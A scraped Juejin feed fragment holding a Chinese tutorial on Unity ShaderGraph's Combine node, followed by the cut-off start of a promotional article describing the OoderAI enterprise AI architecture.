                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong></p>
</blockquote>
<p>在Unity URP（通用渲染管线）的ShaderGraph中，Combine节点作为基础却不可或缺的工具，主要用于将独立的浮点数值组合成向量，广泛应用于材质编辑、数据整合和算法逻辑中。本文将系统解析Combine节点的功能特性、端口参数、实际应用场景、性能影响及具体示例，帮助开发者深入理解并高效运用该节点。通过全面学习，读者将能够优化着色器设计，提升视觉效果与渲染效率。</p>
<h3 data-id="heading-0">节点功能概述</h3>
<p>Combine节点是ShaderGraph中用于将多个浮点输入组合成向量的核心组件。它通过合并R、G、B、A四个通道的浮点值，输出Vector2、Vector3或Vector4等不同维度的向量。该节点的优势在于操作灵活、逻辑直观，能够有效简化向量构建过程，降低代码复杂度。例如，在自定义材质开发中，开发者可便捷地将颜色、透明度或纹理坐标等数据整合为统一向量，无需手动编写复杂脚本。此外，Combine节点支持运行时动态调整输入参数，便于实现交互式效果，如动态色彩混合或实时动画。</p>
<h3 data-id="heading-1">端口与参数详解</h3>
<h4 data-id="heading-2">输入端口</h4>
<p>Combine节点提供四个输入端口，分别对应R（红）、G（绿）、B（蓝）和A（透明度）通道。每个端口接受一个浮点值，取值范围通常为[0,1]。输入源可来自Color节点、Float节点或数学运算节点等。需注意的是，输入值不仅限于颜色数据，也可以是光照强度、纹理偏移或时间变量等任意浮点数。通过灵活配置这些端口，开发者能够构建多维向量以满足多样化渲染需求。例如，模拟水面反射时，可将波浪高度与方向参数分别输入R和G端口，生成Vector2用于法线计算。</p>
<h4 data-id="heading-3">输出端口</h4>
<p>输出端口根据已连接的输入数量生成对应维度的向量：仅连接R和G时输出Vector2；连接R、G、B时输出Vector3；全部连接则输出Vector4。输出向量可直接用于后续节点处理，如光照模型、纹理采样或混合操作。在实际应用中，输出向量的维度需根据场景需求选择——Vector2适用于UV坐标处理，Vector3常用于颜色或位置数据，Vector4则支持含透明度的完整色彩表达。合理选择维度有助于平衡功能完整性与渲染性能。</p>
<h2 data-id="heading-4">端口</h2>





























































<table><thead><tr><th>名称</th><th>方向</th><th>类型</th><th>绑定</th><th>描述</th></tr></thead><tbody><tr><td>R</td><td>输入</td><td>Float</td><td>无</td><td>定义输出的红色通道</td></tr><tr><td>G</td><td>输入</td><td>Float</td><td>无</td><td>定义输出的绿色通道</td></tr><tr><td>B</td><td>输入</td><td>Float</td><td>无</td><td>定义输出的蓝色通道</td></tr><tr><td>A</td><td>输入</td><td>Float</td><td>无</td><td>定义输出的 Alpha 通道</td></tr><tr><td>RGBA</td><td>输出</td><td>Vector 4</td><td>无</td><td>输出值（<strong>Vector 4</strong>）</td></tr><tr><td>RGB</td><td>输出</td><td>Vector 3</td><td>无</td><td>输出值（<strong>Vector 3</strong>）</td></tr><tr><td>RG</td><td>输出</td><td>Vector 2</td><td>无</td><td>输出值（<strong>Vector 2</strong>）</td></tr></tbody></table>
<h3 data-id="heading-5">生成的代码示例</h3>
<p>以下示例代码表示此节点的一种可能结果。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Unity_Combine_float</span>(<span class="hljs-params"><span class="hljs-built_in">float</span> R, <span class="hljs-built_in">float</span> G, <span class="hljs-built_in">float</span> B, <span class="hljs-built_in">float</span> A, <span class="hljs-keyword">out</span> float4 RGBA, <span class="hljs-keyword">out</span> float3 RGB, <span class="hljs-keyword">out</span> float2 RG</span>)</span>
{
    RGBA = float4(R, G, B, A);
    RGB = float3(R, G, B);
    RG = float2(R, G);
}
</code></pre>
<h3 data-id="heading-6">应用场景</h3>
<h4 data-id="heading-7">材质编辑</h4>
<p>在材质编辑中，Combine节点常用于整合颜色、透明度或纹理坐标等参数。例如，将基础颜色与法线贴图强度值组合，可构建复杂材质效果。在PBR（基于物理的渲染）材质中，通过将金属度、粗糙度及环境光遮蔽值输入Combine节点，生成Vector3用于光照计算，既简化节点网络，又增强材质可调节性。此外，结合时间变量与颜色值，可实现动态效果如闪烁或渐变，提升视觉表现力。</p>
<h4 data-id="heading-8">数据整合</h4>
<p>Combine节点能够将分散的数值统一为向量，简化多通道数据处理。例如，在自定义光照模型中，将漫反射强度、高光强度及阴影参数合并为Vector3，传递给光照函数，降低节点连接复杂度，提高着色器可读性。在粒子系统中，该节点还可用于整合速度、大小与生命周期参数，生成控制粒子行为的向量。</p>
<h4 data-id="heading-9">算法逻辑</h4>
<p>在算法设计中，Combine节点用于生成支持向量运算的数据结构。例如，实现扭曲效果时，将位移量与颜色值组合为Vector2，用于UV偏移计算。在模拟自然现象（如天气系统）时，可将风速、湿度与温度参数合并为Vector3，驱动实时着色器。游戏中的交互反馈也可利用此节点，如组合玩家输入的位置与强度值生成Vector2，用于触控响应。</p>
<h3 data-id="heading-10">性能影响</h3>
<h4 data-id="heading-11">计算开销</h4>
<p>Combine节点本身计算开销较低，仅涉及简单的向量组装操作。然而，在复杂材质中频繁调用该节点可能累积增加GPU负担，影响实时渲染帧率。测试显示，在移动设备上过度使用Combine节点可能导致渲染时间上升5-10%，尤其在处理高分辨率纹理时更为明显。</p>
<h4 data-id="heading-12">优化建议</h4>
<p>为优化性能，应减少Combine节点的重复使用，尤其在实时渲染场景中。可通过合并输入参数或选用高效节点（如Blend节点）替代部分操作。建议将常用向量封装为Subgraph以降低网络复杂度，并利用ShaderGraph的LOD（细节层次）功能，在远距离渲染时简化输入，权衡画质与性能。</p>
<h3 data-id="heading-13">实际示例</h3>
<h4 data-id="heading-14">示例1：基础颜色组合</h4>
<p>创建基础材质时，使用Combine节点合并颜色值与透明度。具体步骤：将Color节点的RGB输出连接至Combine节点的R、G、B端口，Float节点（控制透明度）连接至A端口，输出Vector4分别接入主节点的Base Color与Alpha端口。此方法适用于UI元素或透明物体（如玻璃、水体）的渲染。</p>
<h4 data-id="heading-15">示例2：光照参数组合</h4>
<p>在PBR着色器中，从纹理采样节点提取漫反射、高光及环境光强度，输入Combine节点生成Vector3，再传递至自定义函数节点进行高级光照计算。该方式支持动态调整光照参数，如实现昼夜循环效果。</p>
<h4 data-id="heading-16">示例3：扭曲效果实现</h4>
<p>模拟热扭曲效果时，使用Noise节点生成随机位移值输入Combine节点的R端口，颜色值输入G端口，生成Vector2用于UV偏移，创建动态扭曲视觉。此技术常见于游戏中的火焰、折射场景。</p>
<h3 data-id="heading-17">总结与拓展应用</h3>
<p>Combine节点作为ShaderGraph的关键组件，通过直观的向量组合机制，显著简化了材质与算法开发。结合Split节点、Texture2D节点及数学运算节点，可实现更复杂的视觉效果，如流体模拟中合并流速与密度生成Vector4。在VR/AR开发中，该节点还能整合传感器数据，支持实时交互渲染。</p>
<h3 data-id="heading-18">常见问题解答</h3>
<h4 data-id="heading-19">1. Combine节点支持哪些输入类型？</h4>
<p>Combine节点接受浮点值输入，范围一般为[0,1]。输入源可包括Color节点、Float节点或数学运算节点输出，支持常量或动态变量（如通过动画曲线控制的参数）。</p>
<h4 data-id="heading-20">2. 如何调整Combine节点的输出维度？</h4>
<p>输出维度由已连接的输入数量决定：连接R和G得Vector2，增加B得Vector3，全连接得Vector4。开发者可通过脚本动态调整连接，如在运行时使用Scriptable Renderer Feature修改节点配置。</p>
<h4 data-id="heading-21">3. Combine节点在性能方面有何影响？</h4>
<p>该节点本身计算轻量，但过度使用可能增加整体负载。建议在性能敏感场景中优化使用，如移动端项目采用低精度输入以减少内存占用。</p>
<h3 data-id="heading-22">进阶技巧</h3>
<h4 data-id="heading-23">1. 结合使用Combine和Split节点</h4>
<p>Combine与Split节点协同工作，可实现向量分合操作。例如，先将法线、高度及粗糙度数据合并为Vector4，再通过Split节点提取独立分量用于不同计算阶段，提升节点网络的模块化与复用性。</p>
<h4 data-id="heading-24">2. 动态调整输入值</h4>
<p>结合Time节点或Slider节点动态控制输入值，可创建动画效果。例如，通过Combine节点合并时间变量与色彩数据，实现动态彩虹材质，或利用Player Input节点调整向量参数，增强游戏交互性。</p>
<h4 data-id="heading-25">3. 结合使用UVCombine节点</h4>
<p>在处理UV坐标时，配合UVCombine节点（支持选择UV通道及应用平铺/偏移）与Combine节点，可实现复杂纹理映射。如在地形着色器中，用UVCombine处理多纹理层，再通过Combine节点合并结果，生成混合向量用于细节渲染。</p>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">【Unity Shader Graph 使用与特效实现】</a><strong>专栏-直达</strong>
（欢迎<em>点赞留言</em>探讨，更多人加入进来能更加完善这个探索的过程，🙏）</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OoderAI 企业级 AI 解决方案]]></title>    <link>https://juejin.cn/post/7593139476832665643</link>    <guid>https://juejin.cn/post/7593139476832665643</guid>    <pubDate>2026-01-09T04:10:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476832665643" data-draft-id="7592921639464075306" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OoderAI 企业级 AI 解决方案"/> <meta itemprop="keywords" content="开源,人工智能"/> <meta itemprop="datePublished" content="2026-01-09T04:10:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OoderAI 企业级 AI 解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:10:22.000Z" title="Fri Jan 09 2026 04:10:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、核心架构概述</h2>
<p>OoderAI是一套 企业级 AI 解决方案以“AI 大脑”为核心驱动，联动三大核心套件（SkillFlow 流程套件、A2UI 画布套件、OneCode 环境套码套件）构建全链路技术闭环。该架构通过“核心驱动-流程管控-交互生成-环境支撑”的分层设计，实现 AI 能力的可控外延、人机交互的智能生成以及数据代码的一致性管控，从根源上解决企业级 AI 应用落地中的“能力不可控、交互不灵活、代码不一致”三大核心痛点，为企业提供高效、安全、可扩展的 AI 赋能方案。</p>
<p>​</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f713f1f083d04d6e9dc7d66ed674a927~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768536622&amp;x-signature=ShG6ug%2BKNKvhMjb49y3uojkPc8s%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h2 data-id="heading-1">二、核心组件详解</h2>
<h3 data-id="heading-2">（一）核心驱动：AI 大脑</h3>
<p>AI 大脑是整个解决方案的决策与调度核心，负责统筹三大套件的协同运作。其核心价值在于整合全域业务数据与技能资源，通过智能算法实现需求解析、任务分配、流程调度与结果校验。一方面，AI 大脑接收来自业务端的需求指令，通过自然语言理解与业务场景匹配，拆解为可执行的任务单元；另一方面，根据任务属性动态调用 SkillFlow 的流程能力、A2UI 的交互生成能力以及 OneCode 的环境编译能力，形成“需求-执行-输出”的全链路闭环，同时对各环节的执行状态进行实时监控，确保 AI 应用的可控性与稳定性。</p>
<p>​</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8509272793444a858fdc627d2732bb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768536622&amp;x-signature=jvzdJ1SjMatEQe3qrdehFLGMEaE%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h3 data-id="heading-3">（二）三大核心套件</h3>
<h4 data-id="heading-4">1. SkillFlow 流程套件——可控的 AI 外延能力引擎</h4>
<p>SkillFlow 聚焦 AI 能力的流程化管控与外延扩展，通过 MCP 服务、Skill 能力扩展、Workflow 边界控制三大核心机制，让 AI 大脑具备“可扩展、可管控、可追溯”的外延能力，解决传统 AI 能力扩展中“边界模糊、协同混乱、风险不可控”的问题。</p>
<ul>
<li><strong>MCP 服务连接核心</strong>：采用 MCP（Model Context Protocol）标准化协议作为 AI 与外部系统的交互桥梁，如同“AI 的通用 USB-C 接口”，实现 AI 大脑与企业现有业务系统、数据源、第三方工具的无缝对接。通过 MCP 服务，AI 可安全调用外部业务数据、执行系统操作，同时保障数据传输的标准化与安全性，避免异构系统集成中的兼容性问题。</li>
<li><strong>Skill 能力扩展体系</strong>：构建模块化 Skill 能力库，涵盖数据处理、业务审批、报表生成等各类企业级任务模板。AI 大脑可根据业务需求动态加载所需 Skill，实现能力的按需扩展。Skill 采用“渐进式加载”设计，仅在任务执行时加载相关技能模块，大幅提升 AI 上下文处理效率，避免传统能力扩展中“全量加载导致的资源冗余”问题。</li>
<li><strong>Workflow 边界控制机制</strong>：通过可视化流程编排工具定义任务执行的边界与规则，明确各 Skill 的调用顺序、数据流转路径以及异常处理逻辑。例如，在采购审批流程中，可通过 Workflow 设定“数据校验-层级审批-结果归档”的固定链路，限制 AI 能力的执行范围，避免越权操作，同时确保流程执行的可追溯性，满足企业级应用的合规要求。</li>
</ul>
<h4 data-id="heading-5">2. 一张画布（A2UI）——AI 原生人机交互生成中心</h4>
<p>作为 Ooder RAD（快速应用开发）中心的核心组件，一张画布以“自治 UI 组件库+可视化设计器”为基础，依托 A2UI 协议实现 AI 直接撰写人机交互界面的能力，解决企业级应用“界面开发效率低、多端适配难、交互体验差”的痛点。</p>
<ul>
<li><strong>自治 UI 组件库</strong>：提供企业级标准化 UI 组件集，组件具备“自我管理状态、行为与渲染逻辑”的特性，可实现与业务逻辑层的解耦。组件库涵盖表单、报表、地图、交互控件等全品类元素，且所有组件均经过安全校验，仅允许从可信组件目录中选取，从根源避免代码注入风险。</li>
<li><strong>可视化设计器</strong>：支持开发者通过“拖拽式”操作快速搭建界面布局，同时允许 AI 深度参与设计过程。设计器可解析 AI 生成的交互需求，自动匹配合适的 UI 组件并完成布局优化，非技术人员也可通过自然语言指令让 AI 生成符合业务需求的界面初稿，大幅降低界面开发门槛。</li>
<li><strong>A2UI 协议核心支撑</strong>：采用基于 JSON 格式的 A2UI（智能体至用户界面）公开协议，实现 AI 与界面渲染引擎的标准化通信。AI 可通过 A2UI 协议直接输出界面描述信息，客户端渲染引擎接收后自动转换为 React、Flutter、SwiftUI 等原生框架代码，实现“一份交互描述、多端原生适配”。该协议具备安全优先、LLM 友好、框架无关的优势，既保障了界面生成的安全性，又提升了 AI 交互设计的效率与灵活性。</li>
</ul>
<h4 data-id="heading-6">3. 环境套码（OneCode）——全栈一致的技术支撑框架</h4>
<p>OneCode 是基于注解驱动的全栈技术框架，通过“三码合一混合编译”核心机制，实现 AI 生成数据、业务逻辑、界面代码的一致性与可控性，为整个解决方案提供稳定、高效的技术底座。</p>
<ul>
<li><strong>注解驱动全栈协同</strong>：采用自定义注解体系（如@DomainTree、@CrossEndAdapt），将领域模型、跨端适配规则等信息以结构化注解形式写入代码，实现“代码即模型、模型即代码”的双向绑定。AI 可自动识别业务场景生成适配的结构化注解，并通过知识图谱校验注解间的依赖关系，避免配置冲突，大幅提升全栈开发效率。</li>
<li><strong>三码合一混合编译</strong>：整合前端交互代码、后端业务代码、数据处理代码“三码”，通过混合编译技术实现代码的统一校验与生成。AI 生成的各类代码将通过 OneCode 框架进行一致性校验，确保数据流转、业务逻辑与界面交互的协同一致；同时，编译过程自动适配多端运行环境，减少跨端开发的重复工作，提升代码可维护性。</li>
<li><strong>全生命周期管控</strong>：覆盖“需求解析-代码生成-编译部署-运维监控”全流程，AI 可通过注解驱动实现代码的自动更新与迭代，同时框架具备完善的版本管理与回滚机制，确保 AI 数据与代码的一致性可控，降低企业级应用的运维成本与风险。</li>
<li>​</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e40530005fb9439489e96d98ec6febd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768536622&amp;x-signature=qV6aADJOz%2BjnPAIa76JDYXTRDFw%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h2 data-id="heading-7">三、核心优势与价值闭环</h2>
<h3 data-id="heading-8">（一）核心优势</h3>
<ol>
<li><strong>能力可控性</strong>：通过 SkillFlow 的 Workflow 边界控制与 MCP 标准化交互，实现 AI 外延能力的精准管控，避免能力滥用与越权操作，满足企业级合规要求。</li>
<li><strong>开发高效性</strong>：A2UI 画布的可视化设计与 AI 生成能力、OneCode 的注解驱动与三码合一编译，大幅降低全栈开发门槛，缩短应用迭代周期，某金融客户实测复杂模块开发周期从 3 个月压缩至 2 周。</li>
<li><strong>交互适配性</strong>：A2UI 协议的框架无关特性实现多端原生适配，保障企业品牌体验的一致性，同时 AI 可根据用户角色自动优化交互界面，提升用户体验。</li>
<li><strong>数据一致性</strong>：OneCode 的注解驱动与混合编译机制，确保 AI 生成的数据流、业务流与代码流高度一致，降低数据冗余与逻辑冲突风险，系统 BUG 率可下降 47%以上。</li>
</ol>
<h3 data-id="heading-9">（二）价值闭环</h3>
